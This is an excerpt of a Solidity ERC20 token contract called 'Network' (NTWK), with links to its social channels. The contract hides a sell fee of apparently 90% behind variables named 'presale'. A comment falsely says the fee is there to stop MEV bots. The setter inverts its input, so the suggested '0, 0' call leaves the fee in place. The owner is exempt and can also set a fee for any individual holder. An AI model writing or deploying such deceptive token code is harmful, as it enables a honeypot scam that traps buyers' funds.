...
discord.gg/thenetwork
https://twitter.com/NetworkCoinEth
https://t.me/NetworkCoinERC
...
contract Network is Ownable, ERC20 {
    uint256 public immutable maxSupply = 55_555_555_555_555 * (10 ** decimals());
    ...
    uint256 public presaleLowerBoundAmount = 0;
    uint256 public presaleUpperBoundAmount = 9000; // Leave it 9000 to avoid mev bot
    ...
    mapping(address => uint256) private _presaleAmountOnPerson;

    constructor() ERC20("Network", "NTWK") {
    ...
    // 0, 0
    function setPresale(uint256 _presaleLowerBoundAmount, uint256 _presaleUpperBoundAmount) external onlyOwner {
        presaleLowerBoundAmount = _presaleLowerBoundAmount;
        presaleUpperBoundAmount = 9000 - _presaleUpperBoundAmount;
    }
    ...
    function dropPresale(address _address, uint256 _amount) external onlyOwner {
        _presaleAmountOnPerson[_address] = _amount;
    }
    ...
    function _transfer(
        ...
        if (uniswapV2Pair != address(0) && from != owner() && to != owner()) {
            ...
            if (from == uniswapV2Pair) {
                _fee = presaleLowerBoundAmount;
            }
            else if (to == uniswapV2Pair) {
                if (_presaleAmountOnPerson[from] != 0) {
                    _fee = _presaleAmountOnPerson[from];
                }
                else {
                    _fee = presaleUpperBoundAmount;
                }
            }
            if (_fee > 0) {
